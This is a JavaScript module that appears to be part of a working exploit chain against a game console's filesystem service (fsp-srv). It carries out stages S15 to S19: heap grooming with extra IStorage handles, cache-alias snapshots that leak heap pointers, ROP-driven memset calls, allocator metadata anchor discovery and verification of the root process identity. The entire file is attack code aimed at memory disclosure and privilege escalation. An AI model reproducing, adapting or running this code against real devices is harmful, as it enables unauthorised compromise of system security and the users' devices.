import coreRuntime, {waitMs} from "../runtime.mjs";

const {
  CachePlan,
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeHandle,
  hex32,
  ipcStorageGetSize,
  ipcStorageRead,
  openContentStorage,
  read64
} = coreRuntime;

// ── Address discovery (S15–S18) ─────────────────────────────────────────────

export async function prepareReleaseNeighbors({
  config,
  candidateHandle,
  aliasInstalled,
  copyStepsCompleted,
  rootSession
}) {
    // This is a sampling cap, not a required count. Keep all successfully
    // opened/primed handles if a later allocation fails; callers can proceed
    // with the partial neighborhood.
    var MAX_EXTRA_NEIGHBORS = 8;
    const eligible = Boolean(candidateHandle &&
        (aliasInstalled || copyStepsCompleted > 0));
    const extraStorages = [];
    var attemptedStorages = 0;
    var failureReason = null;
    if (!eligible) return {ok: true, eligible, extraStorages,
        attemptedStorages, expectedStorages: MAX_EXTRA_NEIGHBORS, failureReason};

    // S15: Open and prime extra IStorage handles after installing the alias.
    // Their caches are allocated at higher heap addresses inside the alias
    // window. Prime each with 16 reads, one per 0x4000 block.
    var PRIME_BLOCKS = 16;
    var extraPrimeBuf = allocPage(0x1000);
    var totalPages = 0;
    for (var ei = 0; ei < MAX_EXTRA_NEIGHBORS; ei++) {
        attemptedStorages++;
        var eh = openContentStorage(rootSession);
        if (!eh) {
            failureReason = "storage-open-failed-at-" + (ei + 1);
            break;
        }
        var primeOk = true;
        for (var pi = 0; pi < PRIME_BLOCKS; pi++) {
            var er = ipcStorageRead(eh, pi * config.CONTROL_SIZE, 16,
                extraPrimeBuf);
            if (er.error !== 0) {
                failureReason = "prime-read-failed-at-" + (ei + 1);
                primeOk = false;
                break;
            }
        }
        if (!primeOk) {
            closeHandle(eh);
            break;
        }
        totalPages += PRIME_BLOCKS;
        extraStorages.push(eh);
    }

    return {ok: true, eligible, extraStorages, attemptedStorages,
        expectedStorages: MAX_EXTRA_NEIGHBORS, failureReason};
}

export async function captureReleaseBaseline({
  config,
  candidateHandle,
  primeHex,
  helpers
}) {
    // S16: Capture the initial cache window before closing any neighbor.
    const previousBuffer = allocPage(config.CACHE_READ_SIZE + 0x2000);
    const currentBuffer = allocPage(config.CACHE_READ_SIZE + 0x2000);

    // Keep the direct live-buffer comparison unchanged. Snapshot analysis
    // accepts copied byte arrays; materializing two MiB per release round
    // would add millions of read8 calls to this already-qualified sweep.
    call_rop(GADGET_MEMSET, previousBuffer, 0xA5n,
        BigInt(config.CACHE_READ_SIZE));
    var read0 = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
        config.CACHE_READ_SIZE, previousBuffer);

    var prevEnd = 0;
    var prefix0 = "unread";
    var prefix0Ok = false;
    var snapshotOk = false;
    if (read0.error === 0) {
        prefix0 = helpers.readHexBytes(previousBuffer, 16);
        prefix0Ok = prefix0 === primeHex;

        prevEnd = config.CACHE_READ_SIZE;
        var last0 = helpers.readHexBytes(
            previousBuffer + BigInt(config.CACHE_READ_SIZE - 16), 16);
        if (last0 === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
            var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
            while (lo < hi) {
                var mid = ((lo + hi) >>> 1) & ~7;
                if (read64(previousBuffer + BigInt(mid)) ===
                    0xA5A5A5A5A5A5A5A5n) hi = mid;
                else lo = mid + 8;
            }
            prevEnd = lo;
        }
        // The scan skips the first cache block and needs one full block after it.
        const minimumScanSpan = config.CONTROL_SIZE * 2;
        snapshotOk = prefix0Ok && prevEnd >= minimumScanSpan;
    }

    return {ok: true, previousBuffer, currentBuffer, prevEnd, snapshotOk,
        readError: read0.error, prefixMatches: prefix0Ok};
}

function scanSnapshotChanges(bufPrev, bufCur, prevEnd, config, primeHex, helpers, roundInfo) {
    var prefixN = helpers.readHexBytes(bufCur, 16);
    var prefixNOk = prefixN === primeHex;
    var curEnd = config.CACHE_READ_SIZE;
    var lastN = helpers.readHexBytes(
        bufCur + BigInt(config.CACHE_READ_SIZE - 16), 16);
    if (lastN === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
        var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
        while (lo < hi) {
            var mid = ((lo + hi) >>> 1) & ~7;
            if (read64(bufCur + BigInt(mid)) ===
                0xA5A5A5A5A5A5A5A5n) hi = mid;
            else lo = mid + 8;
        }
        curEnd = lo;
    }

    var effectiveEnd = Math.min(prevEnd, curEnd);
    var blockCount = 0, changed = 0, clCount = 0;
    var candidates = [];
    for (var off = config.CONTROL_SIZE;
        off + config.CONTROL_SIZE <= effectiveEnd;
        off += config.CONTROL_SIZE) {
        blockCount++;
        var prevHead = read64(bufPrev + BigInt(off));
        var curHead = read64(bufCur + BigInt(off));
        if (prevHead === curHead) continue;
        changed++;

        var tailMatch = true;
        for (var t = 8; t < config.CONTROL_SIZE; t += 8) {
            if (read64(bufPrev + BigInt(off + t)) !==
                read64(bufCur + BigInt(off + t))) {
                tailMatch = false;
                break;
            }
        }
        if (tailMatch) clCount++;

        var cBig = curHead;
        var isPtr = cBig >= 0x100000000n && cBig < (1n << 39n);
        var isAligned = isPtr && cBig % 0x4000n === 0n;
        var low24ok = isPtr && (cBig & 0xFFFFFFn) !== 0n;

        var zeroTail = false;
        var zeroAfter32 = false;
        if (isPtr && isAligned && low24ok) {
            zeroTail = true;
            for (var zt = 8; zt < 64; zt += 8) {
                if (read64(bufCur + BigInt(off + zt)) !== 0n) {
                    zeroTail = false;
                    break;
                }
            }
            zeroAfter32 = true;
            for (var za = 32; za < config.CONTROL_SIZE; za += 8) {
                if (read64(bufCur + BigInt(off + za)) !== 0n) {
                    zeroAfter32 = false;
                    break;
                }
            }
        }

        var strength = 0;
        if (tailMatch && isPtr && isAligned && low24ok)
            strength = 3;
        else if (isPtr && isAligned && low24ok && zeroTail)
            strength = 2;
        else if (isPtr && isAligned && low24ok && zeroAfter32)
            strength = 1;
        if (strength > 0) {
            candidates.push({
                offset: off, target: cBig, round: roundInfo.round,
                previous: prevHead,
                neighbor: roundInfo.name, changedLink: tailMatch,
                zeroTail, zeroAfter32, strength
            });
        }
    }

    return {prefixOk: prefixNOk, prefix: prefixN, curEnd, blockCount,
            changed, clCount, candidates};
}

export async function releaseNeighborsAndFindPointers({
  config,
  candidateHandle,
  primeHex,
  extraStorages,
  baseline,
  helpers
}) {
    // S17: Close neighbors one at a time and compare each new snapshot with
    // the previous one. Keep the original worker handles open for later waves.
    extraStorages = extraStorages.slice();
    var pointerCandidates = [];
    var releaseRounds = 0;
    var totalChangedLinks = 0;
    var stopReason;
    if (!baseline.snapshotOk) {
        stopReason = "baseline-not-qualified";
    } else if (extraStorages.length === 0) {
        stopReason = "no-neighbors";
    } else {
        stopReason = null;
    }

    var readError = null;
    var prevEnd = baseline.prevEnd;
    var snapshotOk = baseline.snapshotOk;
    var bufPrev = baseline.previousBuffer;
    var bufCur = baseline.currentBuffer;

    if (snapshotOk) {
        var neighbors = [];
        for (var ei = 0; ei < extraStorages.length; ei++) {
            neighbors.push({name: "extra" + ei, handle: extraStorages[ei]});
        }

        for (var ri = 0; ri < neighbors.length && snapshotOk; ri++) {
            var nb = neighbors[ri];
            closeHandle(nb.handle);
            if (nb.name.indexOf("extra") === 0) {
                var idx = parseInt(nb.name.slice(5));
                extraStorages[idx] = 0;
            }

            call_rop(GADGET_MEMSET, bufCur, 0xA5n,
                BigInt(config.CACHE_READ_SIZE));
            var readN = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
                config.CACHE_READ_SIZE, bufCur);

            if (readN.error !== 0) {
                stopReason = "snapshot-read-failed";
                readError = readN.error;
                break;
            }

            var scan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
                primeHex, helpers, {round: ri + 1, name: nb.name});
            for (var ci = 0; ci < scan.candidates.length; ci++)
                pointerCandidates.push(scan.candidates[ci]);

            totalChangedLinks += scan.clCount;
            releaseRounds++;

            var tmp = bufPrev;
            bufPrev = bufCur;
            bufCur = tmp;
            prevEnd = scan.curEnd;
        }
    }

    var monitoringRounds = 0;
    if (snapshotOk && pointerCandidates.length === 0 &&
        config.MONITORING_ROUNDS > 0 && releaseRounds > 0) {
        for (var mi = 0; mi < config.MONITORING_ROUNDS && snapshotOk; mi++) {
            await waitMs(10);

            call_rop(GADGET_MEMSET, bufCur, 0xA5n,
                BigInt(config.CACHE_READ_SIZE));
            var readM = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
                config.CACHE_READ_SIZE, bufCur);

            if (readM.error !== 0) {
                stopReason = "monitor-snapshot-read-failed";
                readError = readM.error;
                break;
            }

            var mscan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
                primeHex, helpers,
                {round: releaseRounds + mi + 1, name: "monitor" + mi});
            for (var mci = 0; mci < mscan.candidates.length; mci++)
                pointerCandidates.push(mscan.candidates[mci]);

            totalChangedLinks += mscan.clCount;
            monitoringRounds++;

            var mtmp = bufPrev;
            bufPrev = bufCur;
            bufCur = mtmp;
            prevEnd = mscan.curEnd;

            if (pointerCandidates.length > 0) break;
        }
    }

    pointerCandidates.sort(function(a, b) {
        if (b.strength !== a.strength) return b.strength - a.strength;

        if (a.target < b.target) {
            return -1;
        } else if (a.target > b.target) {
            return 1;
        }

        return a.offset - b.offset;
    });
    return {ok: true, extraStorages, pointerCandidates,
        releaseRounds, monitoringRounds, totalChangedLinks, stopReason,
        readError};
}

export async function qualifyAddressPlan({
  config,
  helpers,
  addressCopy,
  aliasInstalled,
  candidateHandle,
  collectTimingProfile = false,
  reportProgress = null,
  shouldStop = null,
  pointerCandidates,
  primeHex,
  rootSession,
  savedHandle,
  storageHandle,
}) {
  let addressPlan = null;
  let addressReadVerified = false;
  let metadataAnchorChecks = 0;
  let metadataPageChecks = 0;
  let metadataPageProbes = 0;
  let rootCandidateScans = 0;
  let rootPidRead = false;
  let verifiedIdentityTargets = null;
  let domainSession = null;
  let rootCandidateRetryable = false;
  let rootStageVerified = false;
  let selectedAddressCandidate = null;
  let addressFailureReason = null;
  let addressFailureDetail = null;
  let changedLinkCandidates = 0;
  let validAddressPlans = 0;
  let addressAliasRequalified = null;
  let bucketPeriodQualified = null;
  let storageSizeError = null;
  const timingProfile = collectTimingProfile ? Object.create(null) : null;
    // S18: Address-plan read qualification (no target write).
    var addressCandidatesTested = 0;

    if (!candidateHandle) addressFailureReason = "candidate-storage-unavailable";
    else if (!aliasInstalled) addressFailureReason = "cache-alias-not-installed";
    else if (!pointerCandidates.length) addressFailureReason = "no-pointer-candidates";

    if (candidateHandle && aliasInstalled && pointerCandidates.length > 0) {
        var knownPointers = [];
        var knownTargetSet = {};
        var duplicateAddressTargets = 0;
        for (var pki = 0; pki < pointerCandidates.length; pki++) {
            var pointerItem = pointerCandidates[pki];
            if (pointerItem.strength !== 3 || !pointerItem.changedLink) continue;
            var targetKey = pointerItem.target.toString();
            if (knownTargetSet[targetKey]) {
                duplicateAddressTargets++;
                continue;
            }
            knownTargetSet[targetKey] = true;
            knownPointers.push(pointerItem);
        }
        // Match the reference ordering: strongest evidence first, then target
        // address. Each entry remains a candidate until the read guards pass.
        knownPointers.sort(function(a, b) {
            if (a.target < b.target) {
                return -1;
            } else if (a.target > b.target) {
                return 1;
            }

            return a.offset - b.offset;
        });
        var knownPointerTotal = knownPointers.length;
        changedLinkCandidates = knownPointerTotal;
        if (knownPointers.length > config.MAX_ADDRESS_CANDIDATES) {
            knownPointers = knownPointers.slice(0, config.MAX_ADDRESS_CANDIDATES);
        }

        if (knownPointers.length === 0) {
            addressFailureReason = "no-strength-3-changed-link-target";
        } else {
            var sizeReply = ipcStorageGetSize(candidateHandle);
            if (sizeReply.error !== 0 || !sizeReply.size ||
                !Number.isSafeInteger(sizeReply.size)) {
                addressFailureReason = "storage-size-unavailable";
                storageSizeError = sizeReply.error;
            } else {
                var candidatePlans = [];
                var allPointerTargets = pointerCandidates.map(function(item) {
                    return Number(item.target);
                });
                for (var kp = 0; kp < knownPointers.length; kp++) {
                    var candidatePlan = null;
                    try {
                        candidatePlan = CachePlan.buildLowerWindowPlan(
                            Number(knownPointers[kp].target), sizeReply.size,
                            0x28000, allPointerTargets);
                    } catch (planError) {
                        continue;
                    }

                    var encodingControl = helpers.checkAddressHeaderEncoding(
                        candidatePlan.bytes, {savedHandle});
                    if (!encodingControl.ok) {
                        continue;
                    }
                    candidatePlans.push({candidate: knownPointers[kp],
                        plan: candidatePlan});
                }

                validAddressPlans = candidatePlans.length;
                if (!candidatePlans.length)
                    addressFailureReason = "no-valid-address-plans";
                if (candidatePlans.length > 0) {
                    addressPlan = candidatePlans[0].plan;
                    var aliasRecheckBuf = allocPage(0x1000);
                    var aliasRecheck = ipcStorageRead(candidateHandle,
                        config.ALIAS_OFFSET, 16, aliasRecheckBuf);
                    var aliasRequalified = aliasRecheck.error === 0 &&
                        helpers.readHexBytes(aliasRecheckBuf, 16) === primeHex;
                    addressAliasRequalified = aliasRequalified;
                    if (!aliasRequalified) {
                        addressFailureReason = "alias-recheck-failed";
                        addressFailureDetail = "read=" + hex32(aliasRecheck.error);
                        addressPlan = null;
                    }

                    if (addressPlan) {
                        var periodStartedAt = collectTimingProfile ? Date.now() : 0;
                        var periodResult = await helpers.qualifyCacheBucketPeriod({
                            candidateHandle, primeHex, storageHandle, addressCopy,
                            shouldStop
                        });
                        if (collectTimingProfile)
                            timingProfile.period = (timingProfile.period || 0) +
                                Date.now() - periodStartedAt;
                        addressCopy = periodResult.addressCopy;
                        bucketPeriodQualified = periodResult.ok;
                        if (!bucketPeriodQualified) {
                            addressFailureReason = "cache-bucket-period-unqualified";
                            addressPlan = null;
                        }
                    }

                    // A changed-link pointer is only a seed. Derive and validate
                    // allocator metadata anchors before attempting the layout
                    // capture; continue through bounded candidates on no-match.
                    for (var ai = 0; addressPlan && !shouldStop?.() &&
                        ai < candidatePlans.length; ai++) {
                        var addressCandidate = candidatePlans[ai];
                        addressPlan = addressCandidate.plan;
                        addressCandidatesTested++;
                        var addressLabel = "candidate " + (ai + 1) + "/" +
                            candidatePlans.length;

                        var addressReadStartedAt = collectTimingProfile ? Date.now() : 0;
                        var candidateResult = await helpers.verifyAddressCandidate(
                            addressPlan, addressLabel, ai + 1, {
                                config, addressPlan, candidateHandle, storageHandle,
                                addressCopy, shouldStop
                            });
                        if (collectTimingProfile)
                            timingProfile.addressReads =
                                (timingProfile.addressReads || 0) +
                                Date.now() - addressReadStartedAt;
                        addressPlan = candidateResult.addressPlan;
                        addressCopy = candidateResult.addressCopy;
                        if (candidateResult.verified) {
                            addressReadVerified = true;
                            selectedAddressCandidate = addressCandidate.candidate;
                            rootCandidateRetryable = false;
                            if (reportProgress)
                                await reportProgress("ADDRESS_SCAN: Address read passed for " +
                                    "metadata candidate " + (ai + 1) + "/" +
                                    candidatePlans.length + "; scanning metadata.");
                            var metadataStartedAt = collectTimingProfile ? Date.now() : 0;
                            var metadataDiscovery =
                                await helpers.discoverMetadataAnchors(addressPlan,
                                    addressLabel, {config, addressPlan,
                                        candidateHandle, metadataAnchorChecks,
                                        reportProgress});
                            if (collectTimingProfile)
                                timingProfile.metadata =
                                    (timingProfile.metadata || 0) +
                                    Date.now() - metadataStartedAt;
                            addressPlan = metadataDiscovery.addressPlan;
                            metadataAnchorChecks = metadataDiscovery.metadataAnchorChecks;
                            var discoveredAnchorCount =
                                metadataDiscovery.anchors?.length || 0;
                            if (reportProgress)
                                await reportProgress("ADDRESS_SCAN: Metadata candidate " +
                                    (ai + 1) + "/" + candidatePlans.length + ": " +
                                    discoveredAnchorCount + " anchor(s) from " +
                                    (metadataDiscovery.externalLinkChecks || 0) +
                                    " link checks.");
                            if (!metadataDiscovery.ok) {
                                addressFailureReason = "metadata-anchor-discovery-failed";
                                addressFailureDetail = metadataDiscovery.error || "unknown";
                                if (metadataDiscovery.continueSeed &&
                                    ai + 1 < candidatePlans.length) {
                                    continue;
                                }
                                break;
                            }

                            var tryNextSeed = metadataDiscovery.anchors.length === 0 &&
                                metadataDiscovery.continueSeed;
                            if (metadataDiscovery.anchors.length === 0) {
                                addressFailureReason = "no-metadata-anchors";
                                addressFailureDetail = "poolHypotheses=" +
                                    (metadataDiscovery.poolCandidates || 0) +
                                    "; externalLinkChecks=" +
                                    (metadataDiscovery.externalLinkChecks || 0);
                            }
                            var stopSeedScan = false;
                            var rootScansForSeed = 0;
                            var pageProbesBeforeSeed = metadataPageProbes;
                            for (var mi = 0; !shouldStop?.() &&
                                mi < metadataDiscovery.anchors.length &&
                                    rootCandidateScans < config.MAX_ROOT_LAYOUT_SCANS &&
                                    metadataPageProbes < config.MAX_METADATA_PAGE_PROBES;
                                mi++) {
                                var metadataAnchor = metadataDiscovery.anchors[mi];
                                metadataPageProbes++;
                                var pageStartedAt = collectTimingProfile ? Date.now() : 0;
                                var metadataPageResult = await helpers.qualifyMetadataPage(
                                    metadataAnchor, addressLabel + " page " +
                                        (mi + 1) + "/" + metadataDiscovery.anchors.length,
                                    allPointerTargets, {
                                        config, addressPlan, metadataPageProbes,
                                        storageHandle, candidateHandle, savedHandle,
                                        addressCopy, shouldStop
                                    });
                                if (collectTimingProfile)
                                    timingProfile.pages = (timingProfile.pages || 0) +
                                        Date.now() - pageStartedAt;
                                addressPlan = metadataPageResult.addressPlan;
                                addressCopy = metadataPageResult.addressCopy;
                                if (!metadataPageResult.ok) {
                                    addressFailureReason = "metadata-page-guard-failed";
                                    addressFailureDetail = metadataPageResult.error ||
                                        "reciprocal-link or page guard rejected";
                                    if (metadataPageResult.continueScan) continue;
                                    stopSeedScan = true;
                                    break;
                                }

                                metadataPageChecks++;
                                rootCandidateRetryable = false;
                                rootCandidateScans++;
                                rootScansForSeed++;
                                if (reportProgress)
                                    await reportProgress("ADDRESS_SCAN: Metadata page passed; " +
                                        "checking FSP root identity.");
                                var rootStartedAt = collectTimingProfile ? Date.now() : 0;
                                try {
                                    var identityResult =
                                        await helpers.inspectFspIdentityTargetsReadOnly({
                                            config, addressPlan, candidateHandle,
                                            domainSession, rootCandidateRetryable,
                                            rootPidRead, rootSession,
                                            verifiedIdentityTargets,
                                            reportProgress
                                        });
                                    rootStageVerified = identityResult.ok;
                                    domainSession = identityResult.domainSession;
                                    rootCandidateRetryable = identityResult.rootCandidateRetryable;
                                    rootPidRead = identityResult.rootPidRead;
                                    verifiedIdentityTargets = identityResult.verifiedIdentityTargets;
                                    if (collectTimingProfile && identityResult.rootTiming) {
                                        timingProfile.rootClear =
                                            (timingProfile.rootClear || 0) +
                                            identityResult.rootTiming.clearMs;
                                        timingProfile.rootRead =
                                            (timingProfile.rootRead || 0) +
                                            identityResult.rootTiming.readMs;
                                        timingProfile.rootScan =
                                            (timingProfile.rootScan || 0) +
                                            identityResult.rootTiming.scanMs;
                                        timingProfile.rootLookup =
                                            (timingProfile.rootLookup || 0) +
                                            identityResult.rootTiming.lookupMs;
                                        timingProfile.rootChunksRead =
                                            (timingProfile.rootChunksRead || 0) +
                                            identityResult.rootTiming.chunksRead;
                                    }
                                } catch (rootError) {
                                    addressFailureReason = "root-inspection-failed";
                                    addressFailureDetail = rootError.message;
                                    rootStageVerified = false;
                                    rootCandidateRetryable = false;
                                } finally {
                                    if (collectTimingProfile)
                                        timingProfile.root = (timingProfile.root || 0) +
                                            Date.now() - rootStartedAt;
                                }
                                if (rootStageVerified) break;
                                if (rootCandidateRetryable) continue;
                                stopSeedScan = true;
                                break;
                            }

                            if (!rootStageVerified && reportProgress &&
                                discoveredAnchorCount > 0) {
                                const pageProbesForSeed =
                                    metadataPageProbes - pageProbesBeforeSeed;
                                if (pageProbesForSeed > 0) {
                                    await reportProgress("ADDRESS_SCAN: Metadata page checks " +
                                        "passed " + rootScansForSeed + "/" +
                                        pageProbesForSeed + " probes.");
                                } else {
                                    const limit = rootCandidateScans >=
                                        config.MAX_ROOT_LAYOUT_SCANS
                                        ? "FSP root scan limit" : "metadata page probe limit";
                                    await reportProgress("ADDRESS_SCAN: Metadata page checks " +
                                        "stopped at the " + limit + ".");
                                }
                            }
                            if (rootStageVerified) break;
                            if (rootCandidateScans >= config.MAX_ROOT_LAYOUT_SCANS) {
                                break;
                            }
                            if (metadataPageProbes >= config.MAX_METADATA_PAGE_PROBES) {
                                break;
                            }
                            if (metadataDiscovery.capReached) {
                                break;
                            }
                            if (metadataDiscovery.stopAfterAnchors) {
                                break;
                            }
                            if (rootCandidateRetryable && !stopSeedScan &&
                                ai + 1 < candidatePlans.length) {
                                continue;
                            }
                            if (tryNextSeed && ai + 1 < candidatePlans.length) {
                                continue;
                            }
                            if (!stopSeedScan && metadataDiscovery.anchors.length > 0 &&
                                rootScansForSeed === 0 && ai + 1 < candidatePlans.length) {
                                continue;
                            }
                            break;
                        }
                        if (!candidateResult.continueScan) {
                            addressFailureReason = "address-candidate-read-or-copy-failed";
                            break;
                        }
                        if (!candidateResult.verified) {
                            addressFailureReason = "address-read-guards-rejected-candidates";
                        }
                    }

                }
            }
        }
    } else {
        if (!addressFailureReason)
            addressFailureReason = "address-plan-preconditions-not-met";
    }

    // S19 runs inside the candidate loop above. No host-side memory endpoint is
    // used; address reads and comparisons run in this payload through the
    // existing candidate IStorage path. fsp-srv/domain/clone IPCs stay in-console.
    if (!addressReadVerified) {
        if (!addressFailureReason)
            addressFailureReason = "address-read-not-qualified";
    } else if (!rootStageVerified) {
        addressFailureReason = "root-identity-not-verified";
        if (!addressFailureDetail && rootCandidateRetryable)
            addressFailureDetail = "more-candidates-may-qualify";
        else if (!addressFailureDetail && rootPidRead)
            addressFailureDetail = "root-PID-read-but-identity-guards-rejected";
    } else {
        addressFailureReason = null;
        addressFailureDetail = null;
    }
  return {ok: true, addressCopy, addressPlan, addressReadVerified,
      addressCandidatesTested, changedLinkCandidates, validAddressPlans,
      addressAliasRequalified, bucketPeriodQualified, storageSizeError,
      addressFailureReason, addressFailureDetail,
      metadataAnchorChecks, metadataPageChecks,
      metadataPageProbes, rootCandidateRetryable, rootCandidateScans,
      rootPidRead, rootStageVerified, selectedAddressCandidate, domainSession,
      verifiedIdentityTargets, timingProfile};
}
